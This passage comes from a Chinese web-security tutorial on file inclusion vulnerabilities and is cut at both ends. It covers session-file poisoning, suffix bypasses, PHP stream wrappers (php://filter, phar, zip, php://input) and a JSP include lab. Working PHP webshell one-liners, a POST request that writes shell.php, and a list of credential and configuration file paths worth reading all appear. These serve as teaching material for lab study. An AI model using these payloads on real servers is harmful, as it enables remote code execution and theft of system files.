+<p>session中的内容可以被控制，传入恶意代码</p>
+</li>
+</ul>
+<h3 id="分析">分析</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们发现此php会将获取到的GET型<code>ctfs</code>变量的值存入到session中，也就是可以控制session中的内容</p>
+<p>我们通过phpinfo页面发现了session的存储路径<code>/var/lib/php/session</code></p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01.png"
+	width="837"
+	height="348"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="session储存位置"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="577px"
+	
+></p>
+<p>当访问<code>http://ip/path/ctfs.php?ctfs=test</code> 后，会在<code>/var/lib/php/session</code>目录下存储session的值。</p>
+<p>session的文件名为<code>sess_+sessionid</code>，<code>sessionid</code>可以通过开发者模式获取。</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25.png"
+	width="1392"
+	height="315"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="获取sessionid"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="441"
+		data-flex-basis="1060px"
+	
+></p>
+<p>所以session的文件名为<code>sess_p44b454elq0mfe2vopqvfm7m37</code></p>
+<p>去服务器上查看，果然有该文件, 而且我们刚刚的test也被写入了</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20.png"
+	width="1502"
+	height="96"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Hello Test! (雾"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1564"
+		data-flex-basis="3755px"
+	
+></p>
+<h3 id="利用">利用</h3>
+<p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip/path/ctfs.php?ctfs=%3C?php%20@eval($_POST[&#39;shell&#39;])?%3E
+</span></span></code></pre></div><p>当访问以上链接的时候，Web应用会在<code>/var/lib/php/session</code>目录下存储session的值</p>
+<p>(同时我们的webshell也被存进去了)</p>
+<p>通过前端推测session储存的文件名<code>sess_p44b454elq0mfe2vopqvfm7m37</code></p>
+<p>通过文件包含的漏洞解析恶意代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip/path/include.php?filename=/var/lib/php/session/sess_p44b454elq0mfe2vopqvfm7m37
+</span></span></code></pre></div><p>通过webshell工具连接(方便使用你的shell)</p>
+<blockquote>
+<p>我本地使用的是<code>AntSword</code></p>
+</blockquote>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15.png"
+	width="1347"
+	height="872"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="370px"
+	
+></p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16.png"
+	width="1347"
+	height="876"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="shell,斯哈斯哈!"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="369px"
+	
+></p>
+<h3 id="思考">思考</h3>
+<p>实际上你只需把shell写到一个Web应用能访问的位置并利用文件包含漏洞进行解析就可以</p>
+<blockquote>
+<p>这个写入的文件可以不考虑后缀，反正最后会<strong>被解析成PHP</strong></p>
+</blockquote>
+<h2 id="bypass远程文件包含绕过特定后缀限制">Bypass:远程文件包含绕过特定后缀限制</h2>
+<p>测试代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀</p>
+<p>由于URL的特性，我们在远程文件包含的时候可以做一些事情</p>
+<h3 id="绕过">?绕过</h3>
+<p>在url中，<code>?</code>后面的表示参数，所以说在文件后面加上<code>?</code>会让后面的.html变成一个参数，从而绕过特定后缀限制</p>
+<p>日志</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">192.168.109.139 - - [11/Sep/2022 11:52:00] &#34;GET /1.html?.html HTTP/1.0&#34; 200 -
+</span></span></code></pre></div><h3 id="绕过-1">#绕过</h3>
+<p>URL中，<code>#</code>号是客户端参数,用于网页位置定位,对于Bypass来讲，重要的是<code>#</code>号之后的参数<strong>不会传入到服务端</strong></p>
+<p>日志</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">192.168.109.139 - - [11/Sep/2022 12:16:08] &#34;GET /1.html HTTP/1.0&#34; 200 -
+</span></span></code></pre></div><h2 id="技巧php伪协议">技巧:PHP伪协议</h2>
+<h3 id="php-输入输出流">php:// 输入输出流</h3>
+<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<blockquote>
+<p>php://filter</p>
+<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+</blockquote>
+<h4 id="用法">用法</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">php://filter/read=convert.base64-encode/resource=你要读取的东西
+</span></span></code></pre></div><h4 id="过程">过程</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip/path/include.php?filename=php://filter/read=convert.base64-encode/resource=你要读取的东西
+</span></span></code></pre></div><blockquote>
+<p>如果在某些场合发现明明存在文件包含漏洞但是某些东西无法读取的话，</p>
+<p>可以base64编码解决</p>
+</blockquote>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30.png"
+	width="1399"
+	height="167"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="837"
+		data-flex-basis="2010px"
+	
+></p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27.png"
+	width="999"
+	height="426"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="读取配置文件"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+></p>
+<h4 id="条件-1">条件</h4>
+<p>只是读取，需要开启 <code>allow_url_fopen</code>，不需要开启 <code>allow_url_include</code>；</p>
+<h3 id="phar伪协议">phar://伪协议</h3>
+<p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
+<h4 id="用法-1">用法</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?file=phar://压缩包/内部文件
+</span></span></code></pre></div><blockquote>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
+</blockquote>
+<h4 id="过程-1">过程</h4>
+<p>写一个php文件，然后用zip压缩为zip文件，然后将后缀改为png等其他格式,然后传入服务器。</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44.png"
+	width="1261"
+	height="649"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="466px"
+	
+></p>
+<p>然后再通过文件上传漏洞和<code>phar://</code>伪协议解析</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47.png"
+	width="843"
+	height="664"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="126"
+		data-flex-basis="304px"
+	
+></p>
+<p>同理，也可以通过这种思路进行getshell,</p>
+<p>将php文件中的phpinfo的代码改为一句话木马即可</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h3 id="zip伪协议">zip伪协议</h3>
+<p>zip伪协议和phar协议类似，但是用法不一样。</p>
+<h4 id="用法-2">用法</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">file=zip://[压缩文件]#[压缩文件内的子文件名]
+</span></span></code></pre></div><h4 id="条件-2">条件</h4>
+<p>PHP &gt; =5.3.0</p>
+<blockquote>
+<p>注意在windows下测试要PHP=5.3.0</p>
+<p>#在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+</blockquote>
+<h4 id="过程-2">过程</h4>
+<p>依旧是先上传，再利用文件包含漏洞进行解析</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip/path/include.php?filename=zip://info.jpg%23info.php
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08.png"
+	width="830"
+	height="669"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="297px"
+	
+></p>
+<p>和phar一样，可shell</p>
+<h3 id="phpinput">php://input</h3>
+<p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<h4 id="用法-3">用法</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?file=php://input
+</span></span></code></pre></div><p>数据利用POST传过去。</p>
+<h4 id="条件-3">条件</h4>
+<p>php配置文件中需同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p>
+<h4 id="过程-3">过程</h4>
+<p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><blockquote>
+<p>注意:当前目录Web应用工作的用户必须要<strong>有写权限</strong>,否则写不了</p>
+</blockquote>
+<p>发送POST包</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/test/include.php?filename=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="g">...
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="g">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
+</span></span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6.png"
+	width="1187"
+	height="502"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="没有红包，但有数据包"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="567px"
+	
+></p>
+<p>然后用你的Webshell工具连接即可</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image.png"
+	width="1079"
+	height="650"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="398px"
+	
+></p>
+<h2 id="补充系统中的敏感路径">补充:系统中的敏感路径</h2>
+<p>常见的敏感路径：</p>
+<ul>
+<li>
+<p>Windows</p>
+<ul>
+<li>
+<p>C:\boot.ini //查看系统版本</p>
+</li>
+<li>
+<p>C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件</p>
+</li>
+<li>
+<p>C:\windows\repair\sam //存储 windows 系统初次安装的密码</p>
+</li>
+<li>
+<p>C:\Program Files\mysql\my.ini //mysql 配置</p>
+</li>
+<li>
+<p>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</p>
+</li>
+<li>
+<p>C:\windows\php.ini //php 配置信息</p>
+</li>
+<li>
+<p>C:\windows\my.ini //mysql 配置文件</p>
+</li>
+</ul>
+</li>
+<li>
+<p>UNIX/Linux</p>
+<ul>
+<li>
+<p>/etc/passwd</p>
+</li>
+<li>
+<p>/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件</p>
+</li>
+<li>
+<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p>
+</li>
+<li>
+<p>/usr/local/app/php5/lib/php.ini //PHP 相关配置</p>
+</li>
+<li>
+<p>/etc/httpd/conf/httpd.conf //apache</p>
+</li>
+<li>
+<p>/etc/php5/apache2/php.ini //ubuntu 系统的默认路径</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>日志默认路径</p>
+<ul>
+<li>
+<p>apache+Linux 日志默认路径
+<code>/etc/httpd/logs/access_log</code>或者<code>/var/log/httpd/access_log</code></p>
+</li>
+<li>
+<p>apache+win2003 日志默认路径
+<code>D:\xampp\apache\logs\access.log</code>, <code>D:\xampp\apache\logs\error.log</code></p>
+</li>
+<li>
+<p>IIS6.0+win2003 默认日志文件
+<code>C:\WINDOWS\system32\Logfiles</code></p>
+</li>
+<li>
+<p>IIS7.0+win2003 默认日志文件
+<code>%SystemDrive%\inetpub\logs\LogFiles</code></p>
+</li>
+<li>
+<p>nginx 日志文件
+日志文件在用户安装目录 logs 目录下,以我的安装路径为例<code>/usr/local/nginx</code>,
+那我的日志目录就是在<code>/usr/local/nginx/logs</code>里</p>
+</li>
+</ul>
+<p>web 中间件默认配置</p>
+<ul>
+<li>
+<p>apache+linux 默认配置文件
+<code>/etc/httpd/conf/httpd.conf</code>或者<code>index.php?page=/etc/init.d/httpd</code></p>
+</li>
+<li>
+<p>IIS6.0+win2003 配置文件
+<code>C:/Windows/system32/inetsrv/metabase.xml</code></p>
+</li>
+<li>
+<p>IIS7.0+WIN 配置文件
+<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
+</li>
+</ul>
+<blockquote>
+<p>P.S. burp的intruder里面自带一些路径</p>
+</blockquote>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image.png"
+	width="1210"
+	height="481"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image.png"
+	width="1217"
+	height="320"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="380"
+		data-flex-basis="912px"
+	
+></p>
+<h2 id="javaweb文件包含">Javaweb:文件包含?</h2>
+<p>以为只有PHP中存在文件包含漏洞?</p>
+<p>不不不~~  :)</p>
+<p>实际上只要存在文件包含的功能，无论语言都有可能存在这样的问题，</p>
+<p>而且利用的逻辑基本上是相同的</p>
+<h3 id="小逝验">小逝验</h3>
+<p>在目标机器上起一个Tomcat环境</p>
+<p>新建一个<code>test.jsp</code>,</p>
+<p>输入以下代码搭建一个简单的javaweb文件包含漏洞环境</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="c">&lt;!--输出提示--&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">&lt;</span>%out.println(&#34;Input your payload as GET parameter &#39;payload&#39;&#34;);%&gt;
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">&lt;</span>%out.println(&#34;Output: &#34;);%&gt;
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="c">&lt;!--获取payload参数内容传入变量payload--&gt;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">&lt;</span>%String payload = request.getParameter(&#34;payload&#34;);%&gt;
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c">&lt;!--包含变量payload内的内容--&gt;</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="p">&lt;</span><span class="nt">jsp:include</span> <span class="na">page</span><span class="o">=</span><span class="s">&#34;${param.payload}&#34;</span> <span class="p">/&gt;</span>
+</span></span></code></pre></div><h4 id="玩法">玩法</h4>
+<p>给payload参数传你想要包含的路径</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip:8080/path/test.jsp?payload=文件名
+</span></span></code></pre></div><h4 id="测试">测试</h4>
+<p>在<code>test.jsp</code>的相同目录新建一个<code>1.jsp</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="err">&lt;</span>%@ page import=&#34;java.util.*,java.io.*&#34;%&gt;
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="err">&lt;</span>%
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Process p;
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">p = Runtime.getRuntime().exec(&#34;操作系统命令&#34;);
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">OutputStream os = p.getOutputStream();
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">InputStream in = p.getInputStream();
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">DataInputStream dis = new DataInputStream(in);
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">String disr = dis.readLine();
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">while ( disr != null ) {
+</span></span><span class="line"><span class="ln">10</span><span class="cl">   out.println(disr);
+</span></span><span class="line"><span class="ln">11</span><span class="cl">   disr = dis.readLine();
+</span></span><span class="line"><span class="ln">12</span><span class="cl">}
+</span></span><span class="line"><span class="ln">13</span><span class="cl">%&gt;
+</span></span></code></pre></div><p>然后访问</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://ip:8080/path/test.jsp?payload=1.jsp
+</span></span></code></pre></div><p>让1.jsp被包含</p>
+<p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233.png"
+	width="1128"
+	height="259"
